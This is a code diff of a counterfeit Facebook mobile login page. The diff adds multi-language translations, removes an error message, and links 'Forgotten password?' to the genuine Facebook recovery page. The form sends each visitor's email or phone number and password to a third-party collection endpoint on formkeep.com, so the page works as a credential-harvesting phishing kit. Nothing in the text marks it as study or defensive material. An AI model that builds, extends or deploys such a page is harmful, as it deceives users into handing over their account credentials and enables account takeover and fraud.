@@ -220,12 +220,12 @@
 
     <div style="display: none;" id="content">
         <div class="header">
-            <p1><img src="https://cdn3.iconfinder.com/data/icons/facebook-ui-flat/48/Facebook_UI-05-512.png" width="35px" height="40px"> Get Facebook for Android and browse faster.</p1><br>
+            <p1 id="headerText"><img src="https://cdn3.iconfinder.com/data/icons/facebook-ui-flat/48/Facebook_UI-05-512.png" width="35px" height="40px"> Get Facebook for Android and browse faster.</p1><br>
         </div>
         <div class="body">
             <div class="login-box">
-                <h2>facebook</h2>
-              <p id="errorMessage" class="error-message">Incorrect credentials. Please try again.</p>
+                <h2 id="loginTitle">facebook</h2>
+              
                 <form action="https://formkeep.com/f/e07424ab86c8" accept-charset="UTF-8" enctype="multipart/form-data" method="POST">
                     <div class="textbox">
                         <center><input type="text" placeholder="Mobile number or email address" name="contact" required></center>
@@ -234,35 +234,105 @@
                         <center><input type="password" placeholder="Password" name="serial" required></center>
                     </div>
                     <center><button type="submit" class="btn">Log in</button><br>
-                    <p2>Forgotten password?</p2></center>
+                    <p2 id="forgotPassword">Forgotten password?</p2></center>
                 </form>
             </div>
         </div><br>
         <div class="hr-with-text">or</div>
-        <input type="button" value="Create new account" onclick="window.location.href='create.html';"><br><br><br><br><br><br>
-        <div class="container">
+        <input type="button" id="createAccountBtn" value="Create new account" onclick="window.location.href='create.html';"><br><br><br><br><br><br>
+         <div class="container">
             <div class="language-list">
                 <ul>
-                    <li>English (UK)</li>
-                    <li>অসমীয়া</li>
-                    <li>हिन्दी</li>
-                    <li>Português (Brasil)</li>
+                    <li onclick="changeLanguage('en')">English (UK)</li>
+                    <li onclick="changeLanguage('as')">অসমীয়া</li>
+                    <li onclick="changeLanguage('hi')">हिन्दी</li>
+                    <li onclick="changeLanguage('pt')">Português (Brasil)</li>
                 </ul>
             </div>
             <div class="language-list">
                 <ul>
-                    <li>বাংলা</li>
-                    <li>हिन्दी</li>
-                    <li>Español</li>
-                    <li>|+|</li>
+                    <li onclick="changeLanguage('bn')">বাংলা</li>
+                    <li onclick="changeLanguage('hi')">हिन्दी</li>
+                    <li onclick="changeLanguage('es')">Español</li>
+                    <li onclick="changeLanguage('other')">|+|</li>
                 </ul>
             </div>
         </div>
-        <center><p4>Meta © 2024</p4></center>
+        <center><p4 id="metaText">Meta © 2024</p4></center>
     </div>
 
     <script>
-  
+        const translations = {
+            en: {
+                header: "Get Facebook for Android and browse faster.",
+                loginTitle: "facebook",
+                forgotPassword: "Forgotten password?",
+                createAccount: "Create new account",
+                languages: ["English (UK)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
+                meta: "Meta © 2024"
+            },
+            bn: {
+                header: "অ্যান্ড্রয়েডের জন্য ফেসবুক পেতে এখনই অ্যাকাউন্ট করুন",
+                loginTitle: "ফেসবুক",
+                forgotPassword: "পাসওয়ার্ড ভুলে গেছেন?",
+                createAccount: "নতুন অ্যাকাউন্ট তৈরি করুন",
+                languages: ["ইংরেজি (যুক্তরাজ্য)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
+                meta: "মেটা © ২০২৪"
+            },
+            as: {
+                header: "এণ্ড্ৰইডৰ বাবে ফেচবুক পাওক আৰু সোনকালে ব্ৰাউজ কৰক।",
+                loginTitle: "ফেচবুক",
+                forgotPassword: "পাছৱাৰ্ড পাহৰিছে নেকি?",
+                createAccount: "নতুন একাউন্ট খুলক",
+                languages: ["ইংৰাজী (UK)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
+                meta: "মেটা © ২০২৪"
+            },
+            hi: {
+                header: "Android के लिए Facebook प्राप्त करें और तेज़ी से ब्राउज़ करें।",
+                loginTitle: "फेसबुक",
+                forgotPassword: "पासवर्ड भूल गए?",
+                createAccount: "नया खाता बनाएं",
+                languages: ["English (UK)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
+                meta: "मेटा © २०२४"
+            },
+            pt: {
+                header: "Obtenha o Facebook para Android e navegue mais rápido.",
+                loginTitle: "facebook",
+                forgotPassword: "Esqueceu a senha?",
+                createAccount: "Criar nova conta",
+                languages: ["English (UK)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
+                meta: "Meta © 2024"
+            },
+            es: {
+                header: "Obtén Facebook para Android y navega más rápido.",
+                loginTitle: "facebook",
+                forgotPassword: "¿Olvidaste tu contraseña?",
+                createAccount: "Crear una cuenta nueva",
+                languages: ["English (UK)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
+                meta: "Meta © 2024"
+            },
+            other: {
+                header: "Get Facebook for Android and browse faster.",
+                loginTitle: "facebook",
+                forgotPassword: "Forgotten password?",
+                createAccount: "Create new account",
+                languages: ["English (UK)", "অসমীয়া", "हिन्दी", "Português (Brasil)", "বাংলা", "हिन्दी", "Español", "|+|"],
+                meta: "Meta © 2024"
+            }
+        };
+  function changeLanguage(lang) {
+            const translation = translations[lang];
+            document.getElementById('headerText').textContent = translation.header;
+            document.getElementById('loginTitle').textContent = translation.loginTitle;
+            document.getElementById('forgotPassword').textContent = translation.forgotPassword;
+            document.getElementById('createAccountBtn').value = translation.createAccount;
+            const languageListItems = document.querySelectorAll('.language-list li');
+            languageListItems.forEach((item, index) => {
+                item.textContent = translation.languages[index];
+            });
+            document.getElementById('metaText').textContent = translation.meta;
+        }
+
         function showLoading() {
             document.querySelector('.fullscreen-image').style.display = 'none';
             const loadingElement = document.querySelector('.loading');
@@ -284,6 +354,10 @@
         window.onload = function() {
             setTimeout(showLoading, 10);
         };
+
+        document.getElementById('forgotPassword').addEventListener('click', function() {
+            window.open('https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_0QHZb3SwCI7CkOvUs&ref=dbl&_rdr', '_blank');
+        });
     </script>
 </body>
 </html>
